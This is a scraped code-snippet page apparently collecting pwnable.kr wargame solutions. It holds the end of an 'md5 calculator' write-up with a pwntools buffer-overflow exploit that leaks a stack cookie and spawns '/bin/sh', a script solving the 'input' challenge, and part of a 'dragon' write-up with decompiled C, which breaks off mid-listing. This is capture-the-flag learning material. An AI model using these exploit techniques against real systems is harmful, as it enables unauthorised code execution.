alt1"><code class="python plain">```</code></div><div class="line number59 index58 alt2">&nbsp;</div><div class="line number60 index59 alt1"><code class="python plain">Since the `g_buf` </code><code class="python keyword">is</code> <code class="python keyword">in</code> <code class="python plain">`.bss`, </code><code class="python keyword">and</code> <code class="python plain">`PIE` </code><code class="python keyword">is</code> <code class="python plain">closed, we can simply write `</code><code class="python keyword">/</code><code class="python functions">bin</code><code class="python keyword">/</code><code class="python plain">sh\</code><code class="python value">0</code><code class="python plain">` at the end of </code><code class="python functions">input</code><code class="python plain">.</code></div><div class="line number61 index60 alt2">&nbsp;</div><div class="line number62 index61 alt1"><code class="python plain">POC:</code></div><div class="line number63 index62 alt2"><code class="python plain">```</code></div><div class="line number64 index63 alt1"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number65 index64 alt2"><code class="python keyword">import</code> <code class="python plain">time,os</code></div><div class="line number66 index65 alt1"><code class="python plain">t</code><code class="python keyword">=</code><code class="python functions">int</code><code class="python plain">(time.time())</code></div><div class="line number67 index66 alt2"><code class="python plain">sh </code><code class="python keyword">=</code> <code class="python plain">process(</code><code class="python string">'/home/c/ctf/hash'</code><code class="python plain">)</code></div><div class="line number68 index67 alt1"><code class="python plain">sh.recvuntil(</code><code class="python string">"captcha"</code><code class="python plain">)</code></div><div class="line number69 index68 alt2"><code class="python plain">captcha</code><code class="python keyword">=</code><code class="python plain">sh.recvline(timeout</code><code class="python keyword">=</code><code class="python value">10</code><code class="python plain">)</code></div><div class="line number70 index69 alt1"><code class="python plain">captchapos</code><code class="python keyword">=</code><code class="python plain">captcha.find(</code><code class="python string">' : '</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python functions">len</code><code class="python plain">(</code><code class="python string">' : '</code><code class="python plain">)</code></div><div class="line number71 index70 alt2"><code class="python plain">captcha</code><code class="python keyword">=</code><code class="python plain">captcha[captchapos:].strip()</code></div><div class="line number72 index71 alt1"><code class="python plain">sh.sendline(captcha)</code></div><div class="line number73 index72 alt2"><code class="python functions">print</code> <code class="python plain">sh.recvline(timeout</code><code class="python keyword">=</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number74 index73 alt1"><code class="python functions">print</code> <code class="python plain">sh.recvline(timeout</code><code class="python keyword">=</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number75 index74 alt2"><code class="python functions">print</code> <code class="python string">"Calling:"</code><code class="python plain">,</code><code class="python string">"/home/c/ctf/hashc "</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(t)</code><code class="python keyword">+</code><code class="python string">" "</code><code class="python keyword">+</code><code class="python plain">captcha</code></div><div class="line number76 index75 alt1"><code class="python plain">cookie </code><code class="python keyword">=</code> <code class="python string">"0x"</code><code class="python keyword">+</code><code class="python plain">os.popen(</code><code class="python string">"/home/c/ctf/hashc "</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(t)</code><code class="python keyword">+</code><code class="python string">" "</code><code class="python keyword">+</code><code class="python plain">captcha).read().strip()</code></div><div class="line number77 index76 alt2"><code class="python functions">print</code> <code class="python string">"cookie:"</code><code class="python plain">,cookie</code></div><div class="line number78 index77 alt1"><code class="python plain">sh.sendline(b64e((p32(</code><code class="python value">0x08049187</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python plain">p32(</code><code class="python value">720</code><code class="python keyword">/</code><code class="python value">3</code><code class="python keyword">*</code><code class="python value">4</code><code class="python keyword">+</code><code class="python value">0x0804B0E0</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">24</code><code class="python keyword">+</code><code class="python plain">p32(</code><code class="python functions">int</code><code class="python plain">(cookie,</code><code class="python value">16</code><code class="python plain">))</code><code class="python keyword">+</code><code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">12</code><code class="python plain">)</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">720</code><code class="python keyword">/</code><code class="python value">48</code><code class="python plain">))</code><code class="python keyword">+</code><code class="python string">"/bin/sh\0"</code><code class="python plain">)</code></div><div class="line number79 index78 alt2"><code class="python plain">sh.interactive()</code></div><div class="line number80 index79 alt1"><code class="python plain">```</code></div><div class="line number81 index80 alt2">&nbsp;</div><div class="line number82 index81 alt1"><code class="python plain">I noticed that the time of the server </code><code class="python keyword">is</code> <code class="python plain">similar to local, just </code><code class="python keyword">try</code> <code class="python plain">some times(However, after trying `</code><code class="python keyword">-</code><code class="python value">180</code><code class="python plain">` to `</code><code class="python value">180</code><code class="python plain">`, I didn</code><code class="python string">'t get shell:( I don'</code><code class="python plain">t know why, maybe the `rand()` </code><code class="python keyword">is</code> <code class="python keyword">not</code> <code class="python plain">the same?).</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
Pwnable.kr md5 calculator writeup
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/thecodexploit">thecodexploit</a>/<a href="https://pythonexample.com/snippet/python/solutionpy_thecodexploit_python">solution.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_990950" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">import</code> <code class="python plain">subprocess</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">os</code></div><div class="line number3 index2 alt2"><code class="python keyword">import</code> <code class="python plain">socket</code></div><div class="line number4 index3 alt1"><code class="python keyword">import</code> <code class="python plain">time</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python comments">#Birinci Bolum</code></div><div class="line number7 index6 alt2"><code class="python plain">arg </code><code class="python keyword">=</code> <code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">99</code></div><div class="line number8 index7 alt1"><code class="python plain">arg </code><code class="python keyword">=</code> <code class="python functions">list</code><code class="python plain">(arg)</code></div><div class="line number9 index8 alt2"><code class="python plain">arg[</code><code class="python functions">ord</code><code class="python plain">(</code><code class="python string">'A'</code><code class="python plain">)</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python plain">""</code></div><div class="line number10 index9 alt1"><code class="python plain">arg[</code><code class="python functions">ord</code><code class="python plain">(</code><code class="python string">'B'</code><code class="python plain">)</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python string">"\x20\x0a\x0d"</code></div><div class="line number11 index10 alt2"><code class="python comments">#Birinci Bolum Sonu</code></div><div class="line number12 index11 alt1">&nbsp;</div><div class="line number13 index12 alt2"><code class="python comments">#Besinci Bolum</code></div><div class="line number14 index13 alt1"><code class="python plain">arg[</code><code class="python functions">ord</code><code class="python plain">(</code><code class="python string">'C'</code><code class="python plain">)</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python string">"3595"</code></div><div class="line number15 index14 alt2"><code class="python comments">#Besinci Bolum Sonu</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="python comments">#Ucuncu Bolum</code></div><div class="line number18 index17 alt1"><code class="python plain">cevre </code><code class="python keyword">=</code> <code class="python plain">os.environ.copy()</code></div><div class="line number19 index18 alt2"><code class="python plain">cevre[</code><code class="python string">"\xde\xad\xbe\xef"</code><code class="python plain">] </code><code class="python keyword">=</code> <code class="python string">"\xca\xfe\xba\xbe"</code></div><div class="line number20 index19 alt1"><code class="python comments">#Ucuncu Bolum Sonu</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="python comments">#Dorduncu Bolum</code></div><div class="line number23 index22 alt2"><code class="python plain">dosya </code><code class="python keyword">=</code> <code class="python functions">open</code><code class="python plain">(</code><code class="python string">"\x0a"</code><code class="python plain">,</code><code class="python string">"w"</code><code class="python plain">)</code></div><div class="line number24 index23 alt1"><code class="python plain">dosya.write(</code><code class="python string">"\x00\x00\x00\x00"</code><code class="python plain">)</code></div><div class="line number25 index24 alt2"><code class="python plain">dosya.close()</code></div><div class="line number26 index25 alt1"><code class="python comments">#Dorduncu Bolum Sonu</code></div><div class="line number27 index26 alt2">&nbsp;</div><div class="line number28 index27 alt1"><code class="python keyword">def</code> <code class="python plain">main():</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r, w </code><code class="python keyword">=</code> <code class="python plain">os.pipe()</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">proc </code><code class="python keyword">=</code> <code class="python plain">subprocess.Popen([</code><code class="python string">"./input"</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">arg,stdin</code><code class="python keyword">=</code><code class="python plain">subprocess.PIPE,stderr</code><code class="python keyword">=</code><code class="python plain">r,env</code><code class="python keyword">=</code><code class="python plain">cevre)</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#Ikinci Bolum</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">proc.stdin.write(</code><code class="python string">"\x00\x0a\x00\xff"</code><code class="python plain">)</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">os.write(w,</code><code class="python string">"\x00\x0a\x02\xff"</code><code class="python plain">)</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#Ikinci Bolum Sonu</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">time.sleep(</code><code class="python value">2</code><code class="python plain">)</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#Besinci Bolum Devami Soketler</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">soket </code><code class="python keyword">=</code> <code class="python plain">socket.socket(socket.AF_INET,socket.SOCK_STREAM)</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">soket.connect((</code><code class="python string">"127.0.0.1"</code><code class="python plain">,</code><code class="python value">3595</code><code class="python plain">))</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">soket.sendall(</code><code class="python string">"\xde\xad\xbe\xef"</code><code class="python plain">)</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">soket.close()</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">time.sleep()</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#Besinci Bolum Sonu</code></div><div class="line number43 index42 alt2">&nbsp;</div><div class="line number44 index43 alt1"><code class="python keyword">if</code> <code class="python plain">__name__ </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"__main__"</code><code class="python plain">:</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">main()</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
My Pwnable.kr Input Solution
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/spnow">spnow</a>/<a href="https://pythonexample.com/snippet/python/readmemd_spnow_python">README.MD</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_643780" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div><div class="line number120 index119 alt1">120</div><div class="line number121 index120 alt2">121</div><div class="line number122 index121 alt1">122</div><div class="line number123 index122 alt2">123</div><div class="line number124 index123 alt1">124</div><div class="line number125 index124 alt2">125</div><div class="line number126 index125 alt1">126</div><div class="line number127 index126 alt2">127</div><div class="line number128 index127 alt1">128</div><div class="line number129 index128 alt2">129</div><div class="line number130 index129 alt1">130</div><div class="line number131 index130 alt2">131</div><div class="line number132 index131 alt1">132</div><div class="line number133 index132 alt2">133</div><div class="line number134 index133 alt1">134</div><div class="line number135 index134 alt2">135</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># Pwnable.kr dragon writeup</code></div><div class="line number2 index1 alt1"><code class="python plain">ihciah@gmail.com</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python plain">This </code><code class="python keyword">is</code> <code class="python plain">a RPG that allow you to choose action </code><code class="python keyword">and</code> <code class="python plain">win the game. However, you cannot win this game unless using some tricks.</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python plain">main:</code></div><div class="line number7 index6 alt2"><code class="python plain">```</code></div><div class="line number8 index7 alt1"><code class="python plain">puts(</code><code class="python string">"Welcome to Dragon Hunter!"</code><code class="python plain">);</code></div><div class="line number9 index8 alt2"><code class="python plain">PlayGame();</code></div><div class="line number10 index9 alt1"><code class="python plain">```</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="python plain">PlayGame:</code></div><div class="line number13 index12 alt2"><code class="python plain">```</code></div><div class="line number14 index13 alt1"><code class="python functions">int</code> <code class="python plain">PlayGame()</code></div><div class="line number15 index14 alt2"><code class="python plain">{</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">result; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">eax@</code><code class="python value">1</code></div><div class="line number17 index16 alt2">&nbsp;</div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">( </code><code class="python value">1</code> <code class="python plain">)</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python plain">( </code><code class="python value">1</code> <code class="python plain">)</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight"</code><code class="python plain">);</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">result </code><code class="python keyword">=</code> <code class="python plain">GetChoice();</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( result !</code><code class="python keyword">=</code> <code class="python value">1</code> <code class="python plain">&amp;&amp; result !</code><code class="python keyword">=</code> <code class="python value">2</code> <code class="python plain">)</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code><code class="python plain">;</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">FightDragon(result);</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( result !</code><code class="python keyword">=</code> <code class="python value">3</code> <code class="python plain">)</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code><code class="python plain">;</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">SecretLevel();</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">result;</code></div><div class="line number33 index32 alt2"><code class="python plain">}</code></div><div class="line number34 index33 alt1"><code class="python plain">```</code></div><div class="line number35 index34 alt2">&nbsp;</div><div class="line number36 index35 alt1"><code class="python plain">FightDragon:</code></div><div class="line number37 index36 alt2"><code class="python plain">```</code></div><div class="line number38 index37 alt1"><code class="python plain">void __cdecl FightDragon(</code><code class="python functions">int</code> <code class="python plain">a1)</code></div><div class="line number39 index38 alt2"><code class="python plain">{</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">char v1; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">al@</code><code class="python value">1</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">void </code><code class="python keyword">*</code><code class="python plain">v2; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">ST1C_4@</code><code class="python value">10</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">v3; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">[sp</code><code class="python keyword">+</code><code class="python value">10h</code><code class="python plain">] [bp</code><code class="python keyword">-</code><code class="python value">18h</code><code class="python plain">]@</code><code class="python value">7</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">void </code><code class="python keyword">*</code><code class="python plain">PLAYER_STRUCT; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">[sp</code><code class="python keyword">+</code><code class="python value">14h</code><code class="python plain">] [bp</code><code class="python keyword">-</code><code class="python value">14h</code><code class="python plain">]@</code><code class="python value">1</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">void </code><code class="python keyword">*</code><code class="python plain">DRAGON_STRUCT; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">[sp</code><code class="python keyword">+</code><code class="python value">18h</code><code class="python plain">] [bp</code><code class="python keyword">-</code><code class="python value">10h</code><code class="python plain">]@</code><code class="python value">1</code></div><div class="line number45 index44 alt2">&nbsp;</div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">PLAYER_STRUCT </code><code class="python keyword">=</code> <code class="python plain">malloc(</code><code class="python value">0x10u</code><code class="python plain">);</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">DRAGON_STRUCT </code><code class="python keyword">=</code> <code class="python plain">malloc(</code><code class="python value">0x10u</code><code class="python plain">);</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">v1 </code><code class="python keyword">=</code> <code class="python plain">Count</code><code class="python keyword">+</code><code class="python keyword">+</code><code class="python plain">;</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( v1 &amp; </code><code class="python value">1</code> <code class="python plain">)</code></div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">1</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">1</code><code class="python plain">;</code></div><div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_BYTE </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">8</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">80</code><code class="python plain">;</code></div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_BYTE </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">9</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">4</code><code class="python plain">;</code></div><div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">3</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">10</code><code class="python plain">;</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">(_DWORD </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">=</code> <code class="python plain">PrintMonsterInfo;</code></div><div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"Mama Dragon Has Appeared!"</code><code class="python plain">);</code></div><div class="line number57 index56 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number58 index57 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">else</code></div><div class="line number59 index58 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number60 index59 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">1</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">0</code><code class="python plain">;</code></div><div class="line number61 index60 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_BYTE </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">8</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">50</code><code class="python plain">;</code></div><div class="line number62 index61 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_BYTE </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">9</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">5</code><code class="python plain">;</code></div><div class="line number63 index62 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)DRAGON_STRUCT </code><code class="python keyword">+</code> <code class="python value">3</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">30</code><code class="python plain">;</code></div><div class="line number64 index63 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">(_DWORD </code><code class="python keyword">*</code><code class="python 